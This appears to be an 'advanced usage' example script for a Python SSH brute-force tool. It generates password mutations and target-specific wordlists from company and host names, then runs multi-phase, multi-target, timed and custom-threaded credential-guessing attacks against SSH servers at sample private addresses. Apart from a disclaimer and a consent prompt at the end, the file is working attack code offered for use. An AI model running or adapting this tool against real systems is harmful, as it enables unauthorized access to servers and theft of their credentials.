#!/usr/bin/env python3
"""
Advanced usage example for SSH Bruteforce Tool

This example demonstrates advanced features like custom configurations,
wordlist manipulation, logging, and attack strategies.
"""

import sys
import os
import time
import threading
from datetime import datetime

# Add src directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from ssh_bruteforce import SSHBruteforce
from config import Config
from utils.logger import Logger
from utils.wordlist_manager import WordlistManager
from colorama import init, Fore, Style

init()


class AdvancedSSHBruteforce:
    """Advanced SSH bruteforce with custom features"""
    
    def __init__(self):
        self.config = Config()
        self.logger = Logger()
        self.wm = WordlistManager()
        self.results = []
        
    def create_target_specific_wordlists(self, target_info):
        """Create wordlists specific to target information"""
        print(f"{Fore.CYAN}Creating target-specific wordlists...{Style.RESET_ALL}")
        
        # Base users and passwords
        base_users = ["admin", "administrator", "root", "user"]
        base_passwords = ["password", "admin", "123456"]
        
        # Add target-specific variations
        if 'company' in target_info:
            company = target_info['company'].lower()
            base_users.extend([company, f"{company}admin", f"{company}user"])
            base_passwords.extend([company, f"{company}123", f"{company}2024"])
        
        if 'hostname' in target_info:
            hostname = target_info['hostname'].lower()
            base_users.append(hostname)
            base_passwords.extend([hostname, f"{hostname}123"])
        
        # Generate password mutations
        mutated_passwords = self.wm.generate_mutations(base_passwords)
        
        # Create custom wordlists
        self.wm.create_custom_wordlist(base_users, "custom/target_users.txt")
        self.wm.create_custom_wordlist(mutated_passwords, "custom/target_passwords.txt")
        
        print(f"Created {len(base_users)} target-specific users")
        print(f"Created {len(mutated_passwords)} password variations")
        
        return "wordlists/custom/target_users.txt", "wordlists/custom/target_passwords.txt"
    
    def multi_target_attack(self, targets):
        """Attack multiple targets sequentially"""
        print(f"{Fore.CYAN}Starting multi-target attack...{Style.RESET_ALL}")
        
        results = {}
        
        for i, target in enumerate(targets, 1):
            print(f"\n{Fore.YELLOW}[{i}/{len(targets)}] Attacking {target['host']}:{target['port']}{Style.RESET_ALL}")
            
            start_time = time.time()
            
            try:
                bruteforcer = SSHBruteforce(
                    target_host=target['host'],
                    port=target.get('port', 22),
                    timeout=target.get('timeout', 5),
                    max_threads=target.get('threads', 5)
                )
                
                # Use custom wordlists if provided
                userlist = target.get('userlist', 'wordlists/common_users.txt')
                passlist = target.get('passlist', 'wordlists/common_passwords.txt')
                
                bruteforcer.run(userlist, passlist)
                
                results[target['host']] = {
                    'found_credentials': bruteforcer.found_credentials,
                    'attempts': bruteforcer.attempts,
                    'duration': time.time() - start_time,
                    'status': 'completed'
                }
                
                # Short delay between targets
                if i < len(targets):
                    print("Waiting 5 seconds before next target...")
                    time.sleep(5)
                    
            except Exception as e:
                results[target['host']] = {
                    'error': str(e),
                    'status': 'failed'
                }
                print(f"{Fore.RED}Error attacking {target['host']}: {e}{Style.RESET_ALL}")
        
        return results
    
    def smart_attack_strategy(self, target_host, port=22):
        """Implement smart attack strategy with phases"""
        print(f"{Fore.CYAN}Starting smart attack strategy...{Style.RESET_ALL}")
        
        phases = [
            {
                'name': 'Default Credentials',
                'userlist': None,  # Use default credentials
                'passlist': None,
                'threads': 3,
                'timeout': 2
            },
            {
                'name': 'Common Users + Weak Passwords',
                'userlist': 'wordlists/common_users.txt',
                'passlist': 'wordlists/common_passwords.txt',
                'threads': 5,
                'timeout': 3
            },
            {
                'name': 'Extended Attack',
                'userlist': 'wordlists/custom/target_users.txt',
                'passlist': 'wordlists/custom/target_passwords.txt',
                'threads': 8,
                'timeout': 5
            }
        ]
        
        all_found_credentials = []
        
        for i, phase in enumerate(phases, 1):
            print(f"\n{Fore.YELLOW}Phase {i}: {phase['name']}{Style.RESET_ALL}")
            print("-" * 50)
            
            try:
                bruteforcer = SSHBruteforce(
                    target_host=target_host,
                    port=port,
                    timeout=phase['timeout'],
                    max_threads=phase['threads']
                )
                
                if phase['userlist'] and phase['passlist']:
                    bruteforcer.run(phase['userlist'], phase['passlist'])
                else:
                    # Default credentials phase
                    bruteforcer.load_credential_combinations()
                    if bruteforcer.queue.qsize() > 0:
                        # Only run if there are credentials to test
                        bruteforcer.run()
                
                if bruteforcer.found_credentials:
                    all_found_credentials.extend(bruteforcer.found_credentials)
                    print(f"{Fore.GREEN}Found credentials in Phase {i}!{Style.RESET_ALL}")
                    
                    # Ask if user wants to continue
                    response = input("\nCredentials found! Continue with next phase? (y/n): ")
                    if response.lower() != 'y':
                        break
                else:
                    print(f"No credentials found in Phase {i}")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Phase {i} interrupted by user{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}Error in Phase {i}: {e}{Style.RESET_ALL}")
        
        return all_found_credentials
    
    def timed_attack(self, target_host, duration_minutes=5, port=22):
        """Run attack for a specific duration"""
        print(f"{Fore.CYAN}Starting timed attack ({duration_minutes} minutes)...{Style.RESET_ALL}")
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=port,
            timeout=2,
            max_threads=10
        )
        
        # Load all credentials
        bruteforcer.load_credential_combinations()
        total_combinations = bruteforcer.queue.qsize()
        
        print(f"Running for {duration_minutes} minutes with {total_combinations} combinations")
        print(f"Start time: {datetime.fromtimestamp(start_time).strftime('%H:%M:%S')}")
        print(f"End time: {datetime.fromtimestamp(end_time).strftime('%H:%M:%S')}")
        
        # Start attack in separate thread
        attack_thread = threading.Thread(target=bruteforcer.run)
        attack_thread.daemon = True
        attack_thread.start()
        
        # Monitor progress
        while time.time() < end_time and attack_thread.is_alive():
            elapsed = time.time() - start_time
            remaining = end_time - time.time()
            
            print(f"\rElapsed: {elapsed:.0f}s | Remaining: {remaining:.0f}s | Attempts: {bruteforcer.attempts}", end="")
            time.sleep(1)
        
        print(f"\n\n{Fore.YELLOW}Time limit reached!{Style.RESET_ALL}")
        return bruteforcer.found_credentials
    
    def custom_config_attack(self, target_host, config_overrides=None):
        """Attack with custom configuration"""
        print(f"{Fore.CYAN}Starting attack with custom configuration...{Style.RESET_ALL}")
        
        # Apply configuration overrides
        if config_overrides:
            for key, value in config_overrides.items():
                self.config.set(key, value)
                print(f"Config: {key} = {value}")
        
        # Create bruteforcer with config values
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=self.config.get('ssh.default_port', 22),
            timeout=self.config.get('ssh.timeout', 5),
            max_threads=self.config.get('bruteforce.max_threads', 10)
        )
        
        # Custom delay between attempts
        delay = self.config.get('bruteforce.delay_between_attempts', 0.1)
        print(f"Using {delay}s delay between attempts")
        
        bruteforcer.run()
        return bruteforcer.found_credentials


def demonstrate_wordlist_management():
    """Demonstrate advanced wordlist management"""
    print(f"{Fore.CYAN}=== Wordlist Management Demo ==={Style.RESET_ALL}")
    
    wm = WordlistManager()
    
    # Show available wordlists
    print("\nAvailable wordlists:")
    wordlists = wm.list_available_wordlists()
    for wl in wordlists:
        print(f"  - {wl}")
    
    # Load and show stats
    users = wm.load_wordlist("common_users.txt")
    passwords = wm.load_wordlist("common_passwords.txt")
    
    print(f"\nUser wordlist stats:")
    user_stats = wm.get_wordlist_stats(users)
    for key, value in user_stats.items():
        print(f"  {key}: {value}")
    
    print(f"\nPassword wordlist stats:")
    pass_stats = wm.get_wordlist_stats(passwords)
    for key, value in pass_stats.items():
        print(f"  {key}: {value}")
    
    # Demonstrate filtering
    print(f"\nFiltering passwords (length 6-8):")
    filtered = wm.filter_wordlist(passwords, min_length=6, max_length=8)
    print(f"Original: {len(passwords)} words")
    print(f"Filtered: {len(filtered)} words")
    
    # Generate mutations
    print(f"\nGenerating mutations for ['test']:")
    mutations = wm.generate_mutations(['test'])
    print(f"Generated {len(mutations)} variations")
    print("Sample mutations:", mutations[:10])


def main():
    """Main function to demonstrate advanced features"""
    print(f"{Fore.GREEN}SSH Bruteforce Tool - Advanced Usage Examples{Style.RESET_ALL}")
    print()
    
    # Initialize advanced bruteforcer
    advanced = AdvancedSSHBruteforce()
    
    examples = [
        ("Wordlist Management Demo", demonstrate_wordlist_management),
        ("Target-Specific Wordlists", lambda: advanced.create_target_specific_wordlists({
            'company': 'acme',
            'hostname': 'server01'
        })),
        ("Smart Attack Strategy", lambda: advanced.smart_attack_strategy("192.168.1.100")),
        ("Multi-Target Attack", lambda: advanced.multi_target_attack([
            {'host': '192.168.1.100', 'port': 22, 'threads': 3},
            {'host': '192.168.1.101', 'port': 22, 'threads': 3}
        ])),
        ("Timed Attack (2 minutes)", lambda: advanced.timed_attack("192.168.1.100", 2)),
        ("Custom Configuration Attack", lambda: advanced.custom_config_attack("192.168.1.100", {
            'bruteforce.max_threads': 15,
            'ssh.timeout': 3,
            'bruteforce.delay_between_attempts': 0.2
        }))
    ]
    
    print("Available examples:")
    for i, (name, _) in enumerate(examples, 1):
        print(f"{i}. {name}")
    print()
    
    try:
        choice = input("Enter your choice (1-6) or 'q' to quit: ").strip()
        
        if choice == 'q':
            return
        
        try:
            example_index = int(choice) - 1
            if 0 <= example_index < len(examples):
                name, func = examples[example_index]
                print(f"\n{Fore.YELLOW}Running: {name}{Style.RESET_ALL}")
                print("=" * 60)
                func()
            else:
                print("Invalid choice!")
        except ValueError:
            print("Invalid input!")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrupted by user{Style.RESET_ALL}")


if __name__ == "__main__":
    # Enhanced disclaimer
    print(f"{Fore.RED}⚠️  ADVANCED TOOL DISCLAIMER ⚠️{Style.RESET_ALL}")
    print("This is an advanced SSH bruteforce tool with powerful features.")
    print("ONLY use this on systems you own or have explicit written permission to test.")
    print("Unauthorized use is illegal and can result in serious legal consequences.")
    print("The developers are not responsible for misuse of this tool.")
    print()
    
    response = input("Do you understand and agree to use this tool responsibly? (yes/no): ")
    if response.lower() in ['yes', 'y']:
        main()
    else:
        print("Tool usage declined.")
        sys.exit(1)
